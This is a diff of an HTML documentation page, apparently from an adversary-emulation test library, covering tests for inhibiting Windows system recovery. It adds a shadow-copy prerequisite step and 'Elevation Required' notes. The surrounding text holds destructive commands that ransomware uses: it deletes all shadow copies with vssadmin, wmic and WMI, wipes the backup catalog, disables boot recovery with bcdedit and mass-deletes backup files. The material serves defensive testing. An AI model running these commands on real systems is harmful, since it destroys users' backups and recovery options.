@@ -354,6 +354,34 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-create-volume-shadow-copy-of-c-this-prereq-command-only-works-on-windows-server-or-windows-8">
+         Description: Create volume shadow copy of C:\ . This prereq command only works on Windows Server or Windows 8.
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#check-prereq-commands">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#get-prereq-commands">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#attack-commands-run-with-command-prompt">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
@@ -494,7 +522,34 @@ execution, if no shadow volumes exist the message “No items found that satisfy
 will delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n
 confirmation prompt. Shadow copies can only be created on Windows server or Windows 8.</p>
 <p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
+<div class="section" id="dependencies-run-with-powershell">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-create-volume-shadow-copy-of-c-this-prereq-command-only-works-on-windows-server-or-windows-8">
+<h5>Description: Create volume shadow copy of C:\ . This prereq command only works on Windows Server or Windows 8.<a class="headerlink" href="#description-create-volume-shadow-copy-of-c-this-prereq-command-only-works-on-windows-server-or-windows-8" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="check-prereq-commands">
+<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span><span class="p">(!(</span><span class="n">vssadmin</span><span class="p">.</span><span class="n">exe</span> <span class="n">list</span> <span class="n">shadows</span> <span class="p">|</span> <span class="n">findstr</span> <span class="s2">&quot;No items found that satisfy the query.&quot;</span><span class="p">))</span> <span class="p">{</span> <span class="n">exit</span> <span class="n">0</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="n">exit</span> <span class="n">1</span> <span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="get-prereq-commands">
+<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>vssadmin.exe create shadow /for=c:
+
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1490</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>vssadmin.exe delete shadows /all /quiet
@@ -513,7 +568,8 @@ confirmation prompt. Shadow copies can only be created on Windows server or Wind
 <h3>Atomic Test #2 - Windows - Delete Volume Shadow Copies via WMI<a class="headerlink" href="#atomic-test-2-windows-delete-volume-shadow-copies-via-wmi" title="Permalink to this headline">¶</a></h3>
 <p>Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
 Shadow copies can only be created on Windows server or Windows 8.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="id1">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>wmic.exe shadowcopy delete
@@ -532,7 +588,8 @@ Shadow copies can only be created on Windows server or Windows 8.</p>
 <h3>Atomic Test #3 - Windows - Delete Windows Backup Catalog<a class="headerlink" href="#atomic-test-3-windows-delete-windows-backup-catalog" title="Permalink to this headline">¶</a></h3>
 <p>Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,
 “The backup catalog has been successfully deleted.” will be displayed in the PowerShell session.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="id2">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>wbadmin.exe delete catalog -quiet
@@ -551,7 +608,8 @@ Shadow copies can only be created on Windows server or Windows 8.</p>
 <h3>Atomic Test #4 - Windows - Disable Windows Recovery Console Repair<a class="headerlink" href="#atomic-test-4-windows-disable-windows-recovery-console-repair" title="Permalink to this headline">¶</a></h3>
 <p>Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
 Upon execution, “The operation completed successfully.” will be displayed in the powershell session.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="id3">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
@@ -573,7 +631,8 @@ bcdedit.exe /set {default} recoveryenabled no
 This technique is used by numerous ransomware families such as Sodinokibi/REvil.
 Executes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution
 there may be no output displayed.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Get-WmiObject</span> <span class="n">Win32_Shadowcopy</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Delete</span><span class="p">();}</span>
@@ -592,7 +651,8 @@ there may be no output displayed.</p>
 <h3>Atomic Test #6 - Windows - Delete Backup Files<a class="headerlink" href="#atomic-test-6-windows-delete-backup-files" title="Permalink to this headline">¶</a></h3>
 <p>Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many “access is denied” messages will appear as the commands try
 to delete files from around the system.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="id4">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
